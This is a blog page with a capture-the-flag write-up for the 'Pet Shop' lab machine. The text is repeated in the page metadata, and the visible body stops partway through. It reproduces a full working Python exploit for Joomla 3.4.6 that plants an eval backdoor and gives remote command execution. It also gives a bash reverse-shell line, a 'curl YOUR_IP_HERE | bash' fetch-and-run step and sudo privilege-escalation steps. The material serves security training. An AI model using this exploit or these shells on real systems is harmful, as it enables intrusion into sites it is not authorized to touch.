<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag chal..."> <link type="application/atom+xml" rel="alternate" href="https://fmf-x0.github.io/feed.xml" title="FmF" /> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Pet Shop | FmF</title> <meta name="generator" content="Jekyll v4.3.2" /> <meta property="og:title" content="Pet Shop" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges. Content: Enumeration Easy way Not too easy way Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. We can see some posts and a user joomla who wrote the posts. Let’s use Wappalyzer to detect more information about what tecnologies the page is using. We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is /administrator. We can try to view it going to: http://10.14.0.65/joomla/administrator By default, the username is admin and the password must be defined in the installation progress. We can try login with the user that we find earlier: “joomla:joomla” but it doesn’t work, so… lets put this aside and continue doing other things. We can use HackTricks to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version. Going to the directory /language/en-GB/en-GB.xml we can see the version of the CMS, now let’s search for public exploits for this version. We can use searchsploit to search for exploits and we can find a lot :) There are various ways to solve the machine, an easy one and a not-too-easy one. Let’s first look at the easy way. Easy way 🛣️: Let’s do more enumeration. We can use wfuzz to do fuzzing in the page. We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information… Ok mmm… Let’s fuzz for file extensions such as backup files: bak, backup, bck… Wow we can see that there is a configuration file configuration.backup. Let’s view its contents. The output is ugly so let’s fix it up. Press ctrl + u to view the source code. This will make the output a lot prettier, and we can see a username and password. :) Now we can login to the machine with the credentials that we found with: ssh ron@10.14.0.65, and we are in. Now that we are inside the machine you need to do one thing to ensure smooth operation: -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l. Not too easy way 🛣️: Let’s go back a bit and look the available exploits. In this case, I am going to use the exploit with the title: 3.4.6 - &#39;configuration.php&#39; Remote Code Execution. You can find all the technical details here. You can use searchsploit -x php/webapps/47465.py to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: searchsploit -m php/webapps/47465.py. If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable. This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the technical details. But to keep this write-up from getting too long, I’m going to give you my script to exploit it. #!/bin/python3 import requests as r, string, random, re, signal, sys from bs4 import BeautifulSoup url = &quot;http://10.14.0.65/joomla/&quot; #PROXS = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;} PROXS = {} def def_handler(sig, num): print(&quot;\n\nSaliendo...\n&quot;) sys.exit(1) signal.signal(signal.SIGINT, def_handler) def random_string(stringLength): letters = string.ascii_lowercase return &#39;&#39;.join(random.choice(letters) for i in range(stringLength)) def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = &#39;assert&#39; template = &#39;s:3:&quot;FmF&quot;;O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}&#39; payload = &#39;file_put_contents(\&#39;configuration.php\&#39;,\&#39;if(isset($_POST[\\\&#39;&#39; + backdoor_param +&#39;\\\&#39;])) eval($_POST[\\\&#39;&#39;+backdoor_param+&#39;\\\&#39;]);\&#39;, FILE_APPEND) || $a=\&#39;http://wtf\&#39;;&#39; function_len = len(function) final = template.replace(&#39;PAYLOAD&#39;,payload).replace(&#39;LENGTH&#39;, str(len(payload))).replace(&#39;FUNC_NAME&#39;, function).replace(&#39;FUNC_LEN&#39;, str(len(function))) return final def request(url, payload): s = r.Session() page = s.get(url + &#39;index.php/login&#39;) soup = BeautifulSoup(page.content, &quot;html.parser&quot;) values = soup.find_all(&quot;input&quot;) csrf = values[-1] # Gets the CSRF token value ok = re.findall(&#39;name=&quot;(.*?)&quot;&#39;, str(csrf)) csrf = ok[0] url = url + &#39;index.php/login?task=user.login&#39; return_value = values[-2] # Gets the return value ok = re.findall(&#39;value=&quot;(.*?)&quot;&#39;, str(return_value)) return_value = ok[0] user_payload = &#39;\\0\\0\\0&#39; * 9 inj_object = &#39;&quot;;&#39; inj_object += payload inj_object += &#39;s:6:&quot;return&quot;;s:102:&#39; # end the object with the &#39;return&#39; part password_payload = &#39;AAA&#39; + inj_object data = { &#39;username&#39;:user_payload, &#39;password&#39;:password_payload, &#39;return&#39;:return_value, csrf:&#39;1&#39; } s.post(url, proxies=PROXS, data=data) def ping_backdoor(url, param_name): while True: command = input(&quot;[RCE]~&gt; &quot;) res = r.post(url + &#39;configuration.php&#39;, data={param_name:&#39;system(\&#39;&#39;+ command +&#39;\&#39;);&#39;}) # Here is where the magic happens print(res.text) if __name__ == &#39;__main__&#39;: backdoor_param = random_string(50) ## Generate a unique string for our payload payload = get_backdoor_pay() print(&quot;[+] Backdoor id: &quot; + backdoor_param) request(url, payload) print(&quot;[+] Backdoor is ready, you can enter now...\n&quot;) ping_backdoor(url, backdoor_param) Now with this, we can execute commands, but this is NOT a full interactive shell yet. To get an interactive shell, there are a lot of ways to do it, but I’m going to use this one: Create a file with the name index.html, with this content: bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1 Now use the command: sudo python3 -m http.server 80 to put a http server where we are sharing our files. And finally use the command nc -lvnp 443 to listen for our reverse connection from our payload above. Now execute the command: curl YOUR_IP_HERE | bash this is going to get the content of the file index.html and interpret the content as a bash command. We can see that we get a shell like www-data user. Now that we are inside the machine you need to do various things to ensure smooth operation: -&gt; script /dev/null -c bash -&gt; ctrl + z -&gt; stty raw -echo; fg -&gt; reset xterm -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l and if we do ctrl + c is not going to kill the shell, more info here. We can see the configuration.backup file so here we can get the creds of the user ron and we can connect through SSH. Privilege escalation 🚩: Now that we are inside the machine as the user ron, we need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting, the binary php can be run as the root user. A quick search in Google tells us that we can escalate privileges with it, search in GTFOBins. We execute the commands: And now we are root :) Hope you like it and learn something new :)" /> <meta property="og:description" content="🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges. Content: Enumeration Easy way Not too easy way Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. We can see some posts and a user joomla who wrote the posts. Let’s use Wappalyzer to detect more information about what tecnologies the page is using. We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is /administrator. We can try to view it going to: http://10.14.0.65/joomla/administrator By default, the username is admin and the password must be defined in the installation progress. We can try login with the user that we find earlier: “joomla:joomla” but it doesn’t work, so… lets put this aside and continue doing other things. We can use HackTricks to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version. Going to the directory /language/en-GB/en-GB.xml we can see the version of the CMS, now let’s search for public exploits for this version. We can use searchsploit to search for exploits and we can find a lot :) There are various ways to solve the machine, an easy one and a not-too-easy one. Let’s first look at the easy way. Easy way 🛣️: Let’s do more enumeration. We can use wfuzz to do fuzzing in the page. We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information… Ok mmm… Let’s fuzz for file extensions such as backup files: bak, backup, bck… Wow we can see that there is a configuration file configuration.backup. Let’s view its contents. The output is ugly so let’s fix it up. Press ctrl + u to view the source code. This will make the output a lot prettier, and we can see a username and password. :) Now we can login to the machine with the credentials that we found with: ssh ron@10.14.0.65, and we are in. Now that we are inside the machine you need to do one thing to ensure smooth operation: -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l. Not too easy way 🛣️: Let’s go back a bit and look the available exploits. In this case, I am going to use the exploit with the title: 3.4.6 - &#39;configuration.php&#39; Remote Code Execution. You can find all the technical details here. You can use searchsploit -x php/webapps/47465.py to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: searchsploit -m php/webapps/47465.py. If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable. This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the technical details. But to keep this write-up from getting too long, I’m going to give you my script to exploit it. #!/bin/python3 import requests as r, string, random, re, signal, sys from bs4 import BeautifulSoup url = &quot;http://10.14.0.65/joomla/&quot; #PROXS = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;} PROXS = {} def def_handler(sig, num): print(&quot;\n\nSaliendo...\n&quot;) sys.exit(1) signal.signal(signal.SIGINT, def_handler) def random_string(stringLength): letters = string.ascii_lowercase return &#39;&#39;.join(random.choice(letters) for i in range(stringLength)) def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = &#39;assert&#39; template = &#39;s:3:&quot;FmF&quot;;O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}&#39; payload = &#39;file_put_contents(\&#39;configuration.php\&#39;,\&#39;if(isset($_POST[\\\&#39;&#39; + backdoor_param +&#39;\\\&#39;])) eval($_POST[\\\&#39;&#39;+backdoor_param+&#39;\\\&#39;]);\&#39;, FILE_APPEND) || $a=\&#39;http://wtf\&#39;;&#39; function_len = len(function) final = template.replace(&#39;PAYLOAD&#39;,payload).replace(&#39;LENGTH&#39;, str(len(payload))).replace(&#39;FUNC_NAME&#39;, function).replace(&#39;FUNC_LEN&#39;, str(len(function))) return final def request(url, payload): s = r.Session() page = s.get(url + &#39;index.php/login&#39;) soup = BeautifulSoup(page.content, &quot;html.parser&quot;) values = soup.find_all(&quot;input&quot;) csrf = values[-1] # Gets the CSRF token value ok = re.findall(&#39;name=&quot;(.*?)&quot;&#39;, str(csrf)) csrf = ok[0] url = url + &#39;index.php/login?task=user.login&#39; return_value = values[-2] # Gets the return value ok = re.findall(&#39;value=&quot;(.*?)&quot;&#39;, str(return_value)) return_value = ok[0] user_payload = &#39;\\0\\0\\0&#39; * 9 inj_object = &#39;&quot;;&#39; inj_object += payload inj_object += &#39;s:6:&quot;return&quot;;s:102:&#39; # end the object with the &#39;return&#39; part password_payload = &#39;AAA&#39; + inj_object data = { &#39;username&#39;:user_payload, &#39;password&#39;:password_payload, &#39;return&#39;:return_value, csrf:&#39;1&#39; } s.post(url, proxies=PROXS, data=data) def ping_backdoor(url, param_name): while True: command = input(&quot;[RCE]~&gt; &quot;) res = r.post(url + &#39;configuration.php&#39;, data={param_name:&#39;system(\&#39;&#39;+ command +&#39;\&#39;);&#39;}) # Here is where the magic happens print(res.text) if __name__ == &#39;__main__&#39;: backdoor_param = random_string(50) ## Generate a unique string for our payload payload = get_backdoor_pay() print(&quot;[+] Backdoor id: &quot; + backdoor_param) request(url, payload) print(&quot;[+] Backdoor is ready, you can enter now...\n&quot;) ping_backdoor(url, backdoor_param) Now with this, we can execute commands, but this is NOT a full interactive shell yet. To get an interactive shell, there are a lot of ways to do it, but I’m going to use this one: Create a file with the name index.html, with this content: bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1 Now use the command: sudo python3 -m http.server 80 to put a http server where we are sharing our files. And finally use the command nc -lvnp 443 to listen for our reverse connection from our payload above. Now execute the command: curl YOUR_IP_HERE | bash this is going to get the content of the file index.html and interpret the content as a bash command. We can see that we get a shell like www-data user. Now that we are inside the machine you need to do various things to ensure smooth operation: -&gt; script /dev/null -c bash -&gt; ctrl + z -&gt; stty raw -echo; fg -&gt; reset xterm -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l and if we do ctrl + c is not going to kill the shell, more info here. We can see the configuration.backup file so here we can get the creds of the user ron and we can connect through SSH. Privilege escalation 🚩: Now that we are inside the machine as the user ron, we need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting, the binary php can be run as the root user. A quick search in Google tells us that we can escalate privileges with it, search in GTFOBins. We execute the commands: And now we are root :) Hope you like it and learn something new :)" /> <link rel="canonical" href="https://fmf-x0.github.io/parrot-ctf/Pet-shop" /> <meta property="og:url" content="https://fmf-x0.github.io/parrot-ctf/Pet-shop" /> <meta property="og:site_name" content="FmF" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2023-08-19T00:00:00-05:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Pet Shop" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-19T00:00:00-05:00","datePublished":"2023-08-19T00:00:00-05:00","description":"🦜 Parrot CTFs is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios. This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges. Content: Enumeration Easy way Not too easy way Privilege escalation Enumeration 🔎: We start by using ping to check the TTL of the machine to determine the OS we are dealing with. Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: Identify OS using TTL value. Now, let’s go with an nmap scan to view the open ports. sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts -p- –&gt; We are doing a scan against all 65535 ports to search for open ports. --open –&gt; It will only report open ports. -sS –&gt; It can be performed quickly, scanning thousands of ports per second. --min-rate 5000 –&gt; It sets the minimum rate of packets sent per second to 5000. -n –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. -v –&gt; It will be verbose in its output. -Pn –&gt; This option skips the host discovery stage. -oN –&gt; It will save the output in a file called “allPorts”. We find out the following open ports: Let’s take a look at what the page has. We can see some posts and a user joomla who wrote the posts. Let’s use Wappalyzer to detect more information about what tecnologies the page is using. We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is /administrator. We can try to view it going to: http://10.14.0.65/joomla/administrator By default, the username is admin and the password must be defined in the installation progress. We can try login with the user that we find earlier: “joomla:joomla” but it doesn’t work, so… lets put this aside and continue doing other things. We can use HackTricks to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version. Going to the directory /language/en-GB/en-GB.xml we can see the version of the CMS, now let’s search for public exploits for this version. We can use searchsploit to search for exploits and we can find a lot :) There are various ways to solve the machine, an easy one and a not-too-easy one. Let’s first look at the easy way. Easy way 🛣️: Let’s do more enumeration. We can use wfuzz to do fuzzing in the page. We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information… Ok mmm… Let’s fuzz for file extensions such as backup files: bak, backup, bck… Wow we can see that there is a configuration file configuration.backup. Let’s view its contents. The output is ugly so let’s fix it up. Press ctrl + u to view the source code. This will make the output a lot prettier, and we can see a username and password. :) Now we can login to the machine with the credentials that we found with: ssh ron@10.14.0.65, and we are in. Now that we are inside the machine you need to do one thing to ensure smooth operation: -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l. Not too easy way 🛣️: Let’s go back a bit and look the available exploits. In this case, I am going to use the exploit with the title: 3.4.6 - &#39;configuration.php&#39; Remote Code Execution. You can find all the technical details here. You can use searchsploit -x php/webapps/47465.py to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: searchsploit -m php/webapps/47465.py. If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable. This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the technical details. But to keep this write-up from getting too long, I’m going to give you my script to exploit it. #!/bin/python3 import requests as r, string, random, re, signal, sys from bs4 import BeautifulSoup url = &quot;http://10.14.0.65/joomla/&quot; #PROXS = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;} PROXS = {} def def_handler(sig, num): print(&quot;\\n\\nSaliendo...\\n&quot;) sys.exit(1) signal.signal(signal.SIGINT, def_handler) def random_string(stringLength): letters = string.ascii_lowercase return &#39;&#39;.join(random.choice(letters) for i in range(stringLength)) def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = &#39;assert&#39; template = &#39;s:3:&quot;FmF&quot;;O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}&#39; payload = &#39;file_put_contents(\\&#39;configuration.php\\&#39;,\\&#39;if(isset($_POST[\\\\\\&#39;&#39; + backdoor_param +&#39;\\\\\\&#39;])) eval($_POST[\\\\\\&#39;&#39;+backdoor_param+&#39;\\\\\\&#39;]);\\&#39;, FILE_APPEND) || $a=\\&#39;http://wtf\\&#39;;&#39; function_len = len(function) final = template.replace(&#39;PAYLOAD&#39;,payload).replace(&#39;LENGTH&#39;, str(len(payload))).replace(&#39;FUNC_NAME&#39;, function).replace(&#39;FUNC_LEN&#39;, str(len(function))) return final def request(url, payload): s = r.Session() page = s.get(url + &#39;index.php/login&#39;) soup = BeautifulSoup(page.content, &quot;html.parser&quot;) values = soup.find_all(&quot;input&quot;) csrf = values[-1] # Gets the CSRF token value ok = re.findall(&#39;name=&quot;(.*?)&quot;&#39;, str(csrf)) csrf = ok[0] url = url + &#39;index.php/login?task=user.login&#39; return_value = values[-2] # Gets the return value ok = re.findall(&#39;value=&quot;(.*?)&quot;&#39;, str(return_value)) return_value = ok[0] user_payload = &#39;\\\\0\\\\0\\\\0&#39; * 9 inj_object = &#39;&quot;;&#39; inj_object += payload inj_object += &#39;s:6:&quot;return&quot;;s:102:&#39; # end the object with the &#39;return&#39; part password_payload = &#39;AAA&#39; + inj_object data = { &#39;username&#39;:user_payload, &#39;password&#39;:password_payload, &#39;return&#39;:return_value, csrf:&#39;1&#39; } s.post(url, proxies=PROXS, data=data) def ping_backdoor(url, param_name): while True: command = input(&quot;[RCE]~&gt; &quot;) res = r.post(url + &#39;configuration.php&#39;, data={param_name:&#39;system(\\&#39;&#39;+ command +&#39;\\&#39;);&#39;}) # Here is where the magic happens print(res.text) if __name__ == &#39;__main__&#39;: backdoor_param = random_string(50) ## Generate a unique string for our payload payload = get_backdoor_pay() print(&quot;[+] Backdoor id: &quot; + backdoor_param) request(url, payload) print(&quot;[+] Backdoor is ready, you can enter now...\\n&quot;) ping_backdoor(url, backdoor_param) Now with this, we can execute commands, but this is NOT a full interactive shell yet. To get an interactive shell, there are a lot of ways to do it, but I’m going to use this one: Create a file with the name index.html, with this content: bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1 Now use the command: sudo python3 -m http.server 80 to put a http server where we are sharing our files. And finally use the command nc -lvnp 443 to listen for our reverse connection from our payload above. Now execute the command: curl YOUR_IP_HERE | bash this is going to get the content of the file index.html and interpret the content as a bash command. We can see that we get a shell like www-data user. Now that we are inside the machine you need to do various things to ensure smooth operation: -&gt; script /dev/null -c bash -&gt; ctrl + z -&gt; stty raw -echo; fg -&gt; reset xterm -&gt; export TERM=xterm This will allow us to clean the screen with ctrl + l and if we do ctrl + c is not going to kill the shell, more info here. We can see the configuration.backup file so here we can get the creds of the user ron and we can connect through SSH. Privilege escalation 🚩: Now that we are inside the machine as the user ron, we need to enumerate the system to find a way to escalate privileges. One thing I always check first is sudo -l. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user. More info about privilege escalation techniques check here. We can see something interesting, the binary php can be run as the root user. A quick search in Google tells us that we can escalate privileges with it, search in GTFOBins. We execute the commands: And now we are root :) Hope you like it and learn something new :)","headline":"Pet Shop","mainEntityOfPage":{"@type":"WebPage","@id":"https://fmf-x0.github.io/parrot-ctf/Pet-shop"},"url":"https://fmf-x0.github.io/parrot-ctf/Pet-shop"}</script> <!-- End Jekyll SEO tag --> <link rel="shortcut icon" href="/favicon.ico" type="image/icon"> <link rel="icon" href="/favicon.ico" type="image/icon"> <!-- stylesheets --> <link rel="stylesheet" type="text/css" href="/assets/css/base.css"> <link rel="stylesheet" type="text/css" href="/assets/css/simplePagination.css"> <link rel="stylesheet" type="text/css" href="/assets/css/highlight-theme.css"> <link rel="stylesheet" type="text/css" href="/assets/css/rouge-code.css"> <link rel="stylesheet" type="text/css" href="/assets/css/post.css"> <!-- javascripts --> <script type="text/javascript" src="/assets/js/jquery.js"></script> <!--[if lt IE 9]> <script src="/assets/js/html5shiv.js"></script> <![endif]--> </head> <!-- bare layout means not header and footer like resume --> <body> <header id="l-header"> <div class="container"> <div class="row navicon"> <a href=""><i class="fa fa-navicon"></i></a> </div> <div class="row navbar"> <nav class="col-lg-8 col-md-8 col-xs-12"> <ul class="row"> <li class="col-lg-3"><a href="/">HOME</a></li> <li class="col-lg-3"> <ul class="subnav"> <a href="javascript:void(0)">POST</a> <li><a href="/category">CATEGORY</a></li> <li><a href="/tag">TAG</a></li> </ul> </li> <li class="col-lg-3"><a href="/about">ABOUT</a></li> </ul> </nav> <div class="search col-lg-4 col-md-4 col-xs-12"> <form> <label for="search"></label> <input id="search-input" name="serach" type="text" placeholder="Search Blog Posts..."> <i class="fa fa-search"></i> </form> </div> </div> </div> </header> <section id="l-main"> <div class="container"> <div id="search-result-wrapper" class="hidden"> <h3>Search Results:</h3> <div id="search-result"></div> </div> <style> #search-result-wrapper { font-size: 2rem; background-color: #eee; padding: 5rem; padding-left: 31rem; margin-top: 1rem; margin-bottom: 1rem; box-shadow: 0 0 10px #999; border-radius: 5px; background: white; } #search-result { padding-left: 3rem; } @media (max-width: 1200px) { #search-result-wrapper { font-size: 1.7rem; padding: 2rem; } #search-result { padding-left: 1rem; } } @media (max-width: 768px) { #search-result-wrapper { margin-top: 24rem !important; } } </style> <script> $(document).ready(function() { input = $("#search-input"); wrapper = $("#search-result-wrapper"); wrapper.hide(); wrapper.removeClass("hidden"); input.on("keyup change", function() { if (! input.val()) { wrapper.slideUp("ease"); } else { wrapper.slideDown("ease"); } }); }); </script> <script src="/assets/js/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-result'), json: "/search.json" }); </script> <div class="row"> <div id="markdown-container" class="col-lg-12"> <header> <p id="post-title">Pet shop</p> <ul class="tags clearfix"> <li><i class="fa fa-tag"></i> Parrot-CTF</li> <li><i class="fa fa-tag"></i> Easy</li> </ul> </header> <p><img src="/assets/img/petShop/1.png" width="800" /></p> <p><a href="https://parrot-ctfs.com/">🦜 Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p> <p>This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.</p> <h1 id="content">Content:</h1> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#easy-way-%EF%B8%8F">Easy way</a></li> <li><a href="#not-too-easy-way-%EF%B8%8F">Not too easy way</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h1 id="enumeration-">Enumeration 🔎:</h1> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p> <p><img src="/assets/img/petShop/2.png" width="600" /></p> <p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let’s go with an nmap scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> –&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> –&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> –&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> –&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> –&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> –&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> –&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> –&gt; It will save the output in a file called “allPorts”.</p> <p>We find out the following open ports:</p> <p><img src="/assets/img/petShop/3.png" width="600" /></p> <p>Let’s take a look at what the page has.</p> <p><img src="/assets/img/petShop/4.png" width="600" /></p> <p>We can see some posts and a user joomla who wrote the posts.</p> <p>Let’s use <a>Wappalyzer</a> to detect more information about what tecnologies the page is using.</p> <p><img src="/assets/img/petShop/5.png" width="400" /></p> <p>We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is <a>/administrator</a>. We can try to view it going to: <code class="language-plaintext highlighter-rouge">http://10.14.0.65/joomla/administrator</code></p> <p><img src="/assets/img/petShop/6.png" width="400" /></p> <p>By default, the username is <code class="language-plaintext highlighter-rouge">admin</code> and the password must be defined in the installation progress. We can try login with the user that we find earlier: “<code class="language-plaintext highlighter-rouge">joomla:joomla</code>” but it doesn’t work, so… lets put this aside and continue doing other things.</p> <p>We can use <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">HackTricks</a> to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.</p> <p><img 